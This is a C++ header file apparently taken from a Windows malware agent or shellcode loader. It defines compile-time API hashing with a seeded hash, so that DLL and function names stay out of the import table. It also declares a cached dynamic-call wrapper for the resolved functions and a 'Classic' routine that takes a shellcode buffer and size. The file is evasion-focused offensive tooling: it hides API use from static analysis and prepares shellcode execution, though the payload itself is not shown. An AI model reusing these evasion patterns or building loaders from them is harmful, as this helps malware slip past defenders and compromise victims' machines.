#include <windows.h>

#include "../../Agent/Include/Native.h"

#define M_CACHE_SIZE 12
#define F_CACHE_SIZE 80

typedef struct _MODULE_CACHE {
    ULONG   ModuleHash;
    HMODULE Module;
} MODULE_CACHE, *PMODULE_CACHE;

typedef struct _FUNCTION_CACHE {
    ULONG   ModuleHash;
    ULONG   FunctionHash;
    FARPROC Function;
} FUNCTION_CACHE, *PFUNCTION_CACHE;

#define H_MAGIC_KEY          5555 // __TIME__[5] + __TIME__[0] + __TIME__[1] + __TIME__[2] + __TIME__[3]
#define H_MAGIC_SEED         5 

#define XprCryptBase    XPR( "Cryptbase.dll" )
#define XprIphlpapi     XPR( "IPHLPAPI.DLL" )
#define XprKernel32     XPR( "KERNEL32.DLL" )
#define XprKernelBase   XPR( "KERNELBASE.dll" )
#define XprMsvcrt       XPR( "msvcrt.dll" )
#define XprNtdll        XPR( "ntdll.dll" )
#define XprWininet      XPR( "wininet.dll" )
#define XprWinhttp      XPR( "winhttp.dll" )
#define XprAdvapi32     XPR( "ADVAPI32.dll" )

#define CONSTEXPR       constexpr

#define XPR( x ) ExpStrA( ( x ) )

CONSTEXPR ULONG ExpStrA(
    _In_ PCHAR String
) {
    ULONG Hash = H_MAGIC_KEY;
    CHAR Char  = 0;

    if ( !String ) {
        return 0;
    }

    while ( ( Char = *String++ ) ) {
        if ( Char >= 'a' && Char <= 'z' ) {
            Char -= 0x20;
        }

        Hash = ( ( Hash << H_MAGIC_SEED ) + Hash ) + Char;
    }

    return Hash;
}

/*==============[ Dereference ]==============*/

#define C_DEF( x )   ( * ( PVOID* )  ( x ) )
#define C_DEF08( x ) ( * ( UINT8*  ) ( x ) )
#define C_DEF16( x ) ( * ( UINT16* ) ( x ) )
#define C_DEF32( x ) ( * ( UINT32* ) ( x ) )
#define C_DEF64( x ) ( * ( UINT64* ) ( x ) )

/*==============[ Casting ]==============*/

#define C_PTR( x )  reinterpret_cast<PVOID>( x )
#define B_PTR( x )  reinterpret_cast<PBYTE>( x )
#define UC_PTR( x ) reinterpret_cast<PUCHAR>( x )

#define A_PTR( x )   reinterpret_cast<PCHAR>( x )
#define W_PTR( x )   reinterpret_cast<PWCHAR>( x )

#define U_64( x ) reinterpret_cast<UINT64>( x )
#define U_32( x ) reinterpret_cast<UINT32>( x )
#define U_16( x ) reinterpret_cast<UINT16>( x )
#define U_8( x )  reinterpret_cast<UINT8>( x )

#ifdef _M_IX86
#define CALLING_CONV __stdcall 
#define UINT64  UINT32
#define PUINT64 PUINT32
#else
#define CALLING_CONV __fastcall
#endif

PVOID LdrLoadFunc( 
    _In_ PVOID BaseModule, 
    _In_ ULONG FuncName 
);

PVOID LdrLoadModule(
    _In_ ULONG Hash
);

typedef HMODULE (*fnLoadLibraryA)( LPCSTR );

namespace Api {

    FARPROC GetCachedFunction( ULONG ModuleHash, ULONG FunctionHash );
    HMODULE GetCachedModule( ULONG ModuleHash );
    BOOL    CacheModule( ULONG ModuleHash, HMODULE Module );
    BOOL    CacheFunction( ULONG ModuleHash, ULONG FunctionHash, FARPROC Function );

    template< typename Ret, typename... Args >
    class CallWrapper {
    public:
        static Ret Call( ULONG ModuleHash, ULONG FunctionHash, Args... args ) {
            
            HMODULE Module = GetCachedModule( ModuleHash );
            if ( !Module ) {
                Module = (HMODULE)LdrLoadModule( ModuleHash );
                if ( !Module ) {
                }
                CacheModule( ModuleHash, Module );
            }
            FARPROC Function = GetCachedFunction( ModuleHash, FunctionHash );
            if ( !Function ) {
                Function = (FARPROC)LdrLoadFunc( Module, FunctionHash );
                if ( !Function ) {
                }
                CacheFunction( ModuleHash, FunctionHash, Function );
            }
            auto Func = reinterpret_cast< Ret( CALLING_CONV *)( Args... ) >( Function );
            return Func( args... );
        }
    };

    template< typename Ret, typename... Args >
    static Ret Call( ULONG ModuleHash, ULONG FunctionHash, Args... args ) {
        return CallWrapper< Ret, Args... >::Call( ModuleHash, FunctionHash, args... );
    }
}

namespace Memory {

    PVOID Copy( PVOID Dest, const PVOID Src, SIZE_T Size );
    VOID Zero( PVOID Ptr, SIZE_T Size );
    VOID Set( PVOID Dest, UCHAR Value, SIZE_T Size );

}

namespace String {
    SIZE_T WCharToChar( PCHAR Dest, PWCHAR Src, SIZE_T MaxAllowed );
    SIZE_T CharToWChar( PWCHAR Dest, PCHAR Src, SIZE_T MaxAllowed );
    SIZE_T LengthA( LPCSTR String );
    SIZE_T LengthW( LPCWSTR String );
    INT    CompareA( LPCSTR Str1, LPCSTR Str2 );
    INT    CompareW( LPCWSTR Str1, LPCWSTR Str2 );
    void   ToUpperCaseChar(char* str);
    void   ToLowerCaseChar( PCHAR Str );
    WCHAR  ToLowerCaseWchar( WCHAR Ch );
    PCHAR  CopyA( PCHAR Dest, LPCSTR Src );
    PWCHAR CopyW( PWCHAR Dest, LPCWSTR Src );
    void   ConcatA( PCHAR Dest, LPCSTR Src );
    void   ConcatW( PWCHAR Dest, LPCWSTR Src );
    BOOL   IsStringEqual( LPCWSTR Str1, LPCWSTR Str2 );
    VOID   InitUnicode( PUNICODE_STRING UnicodeString, PWSTR Buffer );
}

VOID Start(
    VOID
);

#define LdCall    Api::Call
#define LdMem     Memory
#define LdStr     String

#ifdef DEBUG
    #define LdShow( x, ... ) LdCall( XprMsvcrt, XPR( "printf" ), x, ##__VA_ARGS__ )
#else
    #define LdShow( x, ... ) 
#endif

VOID Classic(
    PBYTE  ShellcodeBuffer,
    SIZE_T ShellcodeSize
);

template < typename T >
ULONG HashString(
    _In_ T      String,
    _In_ SIZE_T Length
);